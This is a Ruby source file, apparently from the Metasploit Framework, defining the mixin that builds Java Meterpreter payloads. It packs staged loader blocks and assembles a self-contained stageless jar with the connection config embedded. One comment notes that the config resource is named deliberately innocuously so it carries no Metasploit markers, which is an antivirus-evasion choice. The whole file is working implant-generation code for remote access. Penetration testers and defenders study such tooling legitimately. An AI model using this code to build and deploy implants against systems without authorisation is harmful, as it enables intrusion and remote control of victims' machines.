# -*- coding: binary -*-

require 'rex/zip'
require 'zip'

module Msf

###
#
# Common module stub for Java payloads that make use of Meterpreter.
#
###

module Payload::Java::MeterpreterLoader

  include Msf::Payload::Java
  include Msf::Payload::UUID::Options
  include Msf::Sessions::MeterpreterOptions::Java

  # Resource path the stageless StagelessMain bootstrap reads. Deliberately
  # innocuous — no meterpreter/metasploit markers in the name.
  STAGELESS_CONFIG_RESOURCE = 'META-INF/data'.freeze
  STAGELESS_MAIN_CLASS = 'com.metasploit.meterpreter.StagelessMain'.freeze

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Java Meterpreter & Configuration',
      'Description'   => 'Java-specific meterpreter generation',
      'Author'        => ['OJ Reeves'],
      'Platform'      => 'java',
      'Arch'          => ARCH_JAVA,
      'PayloadCompat' => {'Convention' => 'http https'},
      'Stage'         => {'Payload' => ''}
      ))
  end

  def stage_payload(opts={})
    stage_meterpreter(opts)
  end

  #
  # Override the Payload::Java version so we can load a prebuilt jar to be
  # used as the final stage; calls super to get the intermediate stager.
  #
  # When opts[:stageless] is set, returns a self-contained jar with the
  # TLV config embedded as a resource and Main-Class pinned to
  # StagelessMain — ready to run under `java -jar`.
  #
  def stage_meterpreter(opts={})
    met = MetasploitPayloads.read('meterpreter', 'meterpreter.jar')
    config = generate_config(opts)

    return build_stageless_jar(met, config).pack if opts[:stageless]

    # All of the dependencies to create a jar loader, followed by the length
    # of the jar and the jar itself, then the config
    blocks = [
      generate_default_stage(opts),
      [met.length, met].pack('NA*'),
      [config.length, config].pack('NA*')
    ]

    # Deliberate off by 1 here. The call to super adds a null terminator
    # so we would add 1 for the null terminate and remove one for the call
    # to super.
    block_count = blocks.length + stage_class_files.length

    # Pack all the magic together
    (blocks + [block_count]).pack('A*' * blocks.length + 'N')
  end

  # Build a self-contained stageless jar: take the prebuilt meterpreter.jar,
  # rewrite its manifest to point at StagelessMain, and embed the encoded
  # config as a jar resource that StagelessMain reads at startup. Returns
  # the Rex::Zip::Jar so callers can either .pack it (legacy stage path)
  # or hand it to msfvenom's encoded_jar/generate_jar pipeline.
  # Extra classes the stageless jar needs beyond the shaded meterpreter jar.
  # JarFileClassLoader lives in the javapayload artifact (which the shade
  # plugin deliberately excludes), but `Meterpreter#loadExtension` uses it
  # to load extension jars at runtime.
  STAGELESS_EXTRA_CLASSES = [
    %w[com metasploit meterpreter JarFileClassLoader.class],
  ].freeze

  def build_stageless_jar(src_jar, config_bytes)
    jar = Rex::Zip::Jar.new
    ::Zip::File.open_buffer(::StringIO.new(src_jar)) do |zip|
      zip.each do |entry|
        next if entry.directory?
        next if entry.name == 'META-INF/MANIFEST.MF'
        next if entry.name == STAGELESS_CONFIG_RESOURCE
        jar.add_file(entry.name, entry.get_input_stream.read)
      end
    end
    STAGELESS_EXTRA_CLASSES.each do |parts|
      jar.add_file(parts.join('/'), ::MetasploitPayloads.read('java', *parts))
    end
    jar.add_file(STAGELESS_CONFIG_RESOURCE, config_bytes)
    jar.build_manifest(main_class: STAGELESS_MAIN_CLASS)
    jar
  end

  # `Msf::Simple::Payload.generate_simple` reaches the jar bytes via
  # `encoded_jar` -> `pinst.generate_jar`. The Java meterpreter modules
  # that include this mixin are all `Msf::Payload::Single` (stageless),
  # so build the self-contained jar instead of falling back to
  # `Msf::Payload::Java#generate_jar`, which would emit the staged
  # `metasploit.Payload` loader jar.
  # When the calling module flags `opts[:stageless]`, build the
  # self-contained jar via `build_stageless_jar`. Otherwise fall back to
  # `Msf::Payload::Java#generate_jar`, which emits the staged
  # `metasploit.Payload` loader jar.
  def generate_jar(opts={})
    return super unless opts[:stageless]

    src_jar = MetasploitPayloads.read('meterpreter', 'meterpreter.jar')
    build_stageless_jar(src_jar, generate_config(opts))
  end

  def generate_config(opts={})
    opts[:uuid] ||= generate_payload_uuid
    ds = opts[:datastore] || datastore

    # create the configuration block, which for staged connections is really simple.
    config_opts = {
      ascii_str:  true,
      arch:       opts[:uuid].arch,
      expiration: ds['SessionExpirationTimeout'].to_i,
      uuid:       opts[:uuid],
      transports: opts[:transport_config] || [transport_config(opts)],
      stageless:  opts[:stageless] == true
    }

    # create the configuration instance based off the parameters
    config = Rex::Payloads::Meterpreter::Config.new(config_opts)

    # return the binary version of it
    config.to_b
  end

  def stage_class_files
    # Order matters.  Classes can only reference classes that have already
    # been sent.  The last .class must implement Stage, i.e. have a start()
    # method.
    #
    # The Meterpreter.class stage is just a jar loader, not really anything
    # to do with meterpreter specifically.  This payload should eventually
    # be replaced with an actual meterpreter stage so we don't have to send
    # a second jar.
    [
      [ "javapayload", "stage", "Stage.class" ],
      [ "com", "metasploit", "meterpreter", "JarFileClassLoader.class" ],
      # Must be last!
      [ "javapayload", "stage", "Meterpreter.class" ],
    ]
  end

end
end

